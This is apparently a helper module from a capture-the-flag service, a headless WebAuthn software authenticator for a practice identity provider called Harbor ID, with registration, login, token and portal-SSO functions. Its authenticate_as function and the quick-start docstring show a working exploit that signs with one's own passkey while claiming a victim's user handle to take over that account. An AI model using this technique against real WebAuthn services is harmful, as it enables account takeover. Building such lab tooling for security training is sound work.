"""harborkey.py - headless WebAuthn software authenticator for Harbor ID.

Gives the checker (and players) the same passkey tooling as a real browser,
with no browser required.  Uses standard P-256 / ES256 / CBOR / WebAuthn formats.

Quick start:
    import httpx, harborkey
    idp = "http://localhost:7001"

    # register an account and add a passkey
    with httpx.Client() as c:
        c.post(f"{idp}/register", json={"username": "alice", "email": "alice@harbor.city"})
        cred = harborkey.register(idp, "alice", session_token, client=c)

    # authenticate later
    with httpx.Client() as c:
        token = harborkey.authenticate(idp, username="alice", cred=cred, client=c)

    # exploit: authenticate with your own cred but a victim's user_handle
    with httpx.Client() as c:
        token = harborkey.authenticate_as(idp, cred=cred, user_handle=victim_sub, client=c)
"""
import base64
import hashlib
import json
import os
import struct

import cbor2
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
from cryptography.hazmat.primitives import hashes, serialization

RP_ID = "harbor.city"
ORIGIN = "https://harbor.city"


def _b64u_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _b64u_dec(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


class Credential:
    """holds a P-256 private key, credential id, and the owner's user sub."""

    def __init__(self, cred_id: str, private_key: ec.EllipticCurvePrivateKey, user_id: str):
        self.cred_id = cred_id
        self.private_key = private_key
        self.user_id = user_id
        self.sign_count = 0

    def to_dict(self) -> dict:
        return {
            "cred_id": self.cred_id,
            "pem": self.private_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.PKCS8,
                serialization.NoEncryption(),
            ).decode(),
            "user_id": self.user_id,
            "sign_count": self.sign_count,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "Credential":
        key = serialization.load_pem_private_key(d["pem"].encode(), None)
        c = cls(d["cred_id"], key, d["user_id"])
        c.sign_count = d.get("sign_count", 0)
        return c


def _make_cose_key(private_key: ec.EllipticCurvePrivateKey) -> bytes:
    """encode public key as COSE EC2 key (CBOR map)."""
    pub = private_key.public_key()
    nums = pub.public_numbers()
    x = nums.x.to_bytes(32, "big")
    y = nums.y.to_bytes(32, "big")
    # COSE map: {1: 2 (EC2), 3: -7 (ES256), -1: 1 (P-256), -2: x, -3: y}
    return cbor2.dumps({1: 2, 3: -7, -1: 1, -2: x, -3: y})


def _make_auth_data(cred_id: bytes, private_key: ec.EllipticCurvePrivateKey,
                    sign_count: int = 0, user_present: bool = True,
                    attested: bool = True) -> bytes:
    """build a WebAuthn authenticatorData blob."""
    rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
    flags = 0
    if user_present:
        flags |= 0x01  # UP
    if attested:
        flags |= 0x40  # AT

    auth_data = rp_id_hash + bytes([flags]) + struct.pack(">I", sign_count)

    if attested:
        aaguid = b"\x00" * 16
        cred_id_len = struct.pack(">H", len(cred_id))
        cose_key = _make_cose_key(private_key)
        auth_data += aaguid + cred_id_len + cred_id + cose_key

    return auth_data


def _make_client_data(type_: str, challenge: str) -> bytes:
    """build clientDataJSON bytes."""
    return json.dumps(
        {"type": type_, "challenge": challenge, "origin": ORIGIN}, separators=(",", ":")
    ).encode()


def _sign_assertion(private_key: ec.EllipticCurvePrivateKey, auth_data: bytes,
                    client_data_hash: bytes) -> bytes:
    """sign authenticatorData || SHA256(clientDataJSON) with ES256, return DER."""
    message = auth_data + client_data_hash
    raw_sig = private_key.sign(message, ec.ECDSA(hashes.SHA256()))
    # raw_sig is already DER from cryptography lib
    return raw_sig


def _make_attestation_object(auth_data: bytes) -> bytes:
    """pack a 'none' attestation object."""
    return cbor2.dumps({"fmt": "none", "authData": auth_data, "attStmt": {}})


def register(idp_url: str, username: str, session_token: str,
             client=None) -> "Credential":
    """perform a full registration ceremony and return the new Credential."""
    import httpx
    own = client is None
    c = httpx.Client() if own else client
    try:
        # begin
        r = c.post(
            f"{idp_url}/webauthn/register/begin",
            json={"username": username},
            headers={"Authorization": f"Bearer {session_token}"},
        )
        r.raise_for_status()
        opts = r.json()

        challenge = opts["challenge"]
        user_id_b64 = opts["user"]["id"]
        session_id = opts["sessionId"]
        user_sub = base64.urlsafe_b64decode(user_id_b64 + "==").decode()

        # generate keypair
        private_key = ec.generate_private_key(ec.SECP256R1())
        cred_id = os.urandom(16)
        cred_id_b64 = _b64u_enc(cred_id)

        # build attestation
        auth_data = _make_auth_data(cred_id, private_key, sign_count=0, attested=True)
        att_obj = _make_attestation_object(auth_data)
        client_data = _make_client_data("webauthn.create", challenge)

        # finish
        r = c.post(
            f"{idp_url}/webauthn/register/finish",
            json={
                "sessionId": session_id,
                "user_id": user_sub,   # echoes what server told us
                "response": {
                    "id": cred_id_b64,
                    "type": "public-key",
                    "response": {
                        "clientDataJSON": _b64u_enc(client_data),
                        "attestationObject": _b64u_enc(att_obj),
                    },
                },
            },
        )
        r.raise_for_status()

        return Credential(cred_id_b64, private_key, user_sub)
    finally:
        if own:
            c.close()


def authenticate(idp_url: str, cred: "Credential", username: str | None = None,
                 client=None) -> str:
    """perform a login ceremony for the credential's own user. returns session token."""
    return _do_authenticate(idp_url, cred, username=username, user_handle=None, client=client)


def authenticate_as(idp_url: str, cred: "Credential", user_handle: str,
                    client=None) -> str:
    """exploit helper: sign with cred but claim to be user_handle. returns session token."""
    return _do_authenticate(idp_url, cred, username=None, user_handle=user_handle, client=client)


def _do_authenticate(idp_url: str, cred: "Credential", username: str | None,
                     user_handle: str | None, client=None) -> str:
    import httpx
    own = client is None
    c = httpx.Client() if own else client
    try:
        # begin
        body: dict = {}
        if username:
            body["username"] = username
        r = c.post(f"{idp_url}/webauthn/login/begin", json=body)
        r.raise_for_status()
        opts = r.json()

        challenge = opts["challenge"]
        session_id = opts["sessionId"]

        # build authenticatorData (no AT flag for assertion)
        cred.sign_count += 1
        auth_data = _make_auth_data(
            b"",  # no attested cred data in assertion
            cred.private_key,
            sign_count=cred.sign_count,
            attested=False,
        )
        client_data = _make_client_data("webauthn.get", challenge)
        client_data_hash = hashlib.sha256(client_data).digest()
        sig = _sign_assertion(cred.private_key, auth_data, client_data_hash)

        # userHandle: base64url of user's sub (uuid string)
        if user_handle is not None:
            uh_b64 = _b64u_enc(user_handle.encode())
        else:
            uh_b64 = _b64u_enc(cred.user_id.encode())

        # finish
        r = c.post(
            f"{idp_url}/webauthn/login/finish",
            json={
                "sessionId": session_id,
                "response": {
                    "id": cred.cred_id,
                    "type": "public-key",
                    "response": {
                        "authenticatorData": _b64u_enc(auth_data),
                        "clientDataJSON": _b64u_enc(client_data),
                        "signature": _b64u_enc(sig),
                        "userHandle": uh_b64,
                    },
                },
            },
        )
        r.raise_for_status()
        return r.json()["token"]
    finally:
        if own:
            c.close()


def get_id_token(idp_url: str, session_token: str, claims_param: dict | None = None,
                 nonce: str = "", client=None) -> str:
    """get an id_token from the IdP. claims_param: OIDC claims parameter dict."""
    import httpx
    own = client is None
    c = httpx.Client() if own else client
    try:
        params: dict = {}
        if nonce:
            params["nonce"] = nonce
        if claims_param:
            params["claims"] = json.dumps(claims_param)
        r = c.get(
            f"{idp_url}/account/token",
            params=params,
            headers={"Authorization": f"Bearer {session_token}"},
        )
        r.raise_for_status()
        return r.json()["id_token"]
    finally:
        if own:
            c.close()


def sso_into_portal(portal_url: str, id_token: str, client=None) -> str:
    """present an id_token to the Portal and get a Portal session token."""
    import httpx
    own = client is None
    c = httpx.Client() if own else client
    try:
        r = c.post(f"{portal_url}/crew/session", json={"id_token": id_token})
        r.raise_for_status()
        return r.json()["token"]
    finally:
        if own:
            c.close()
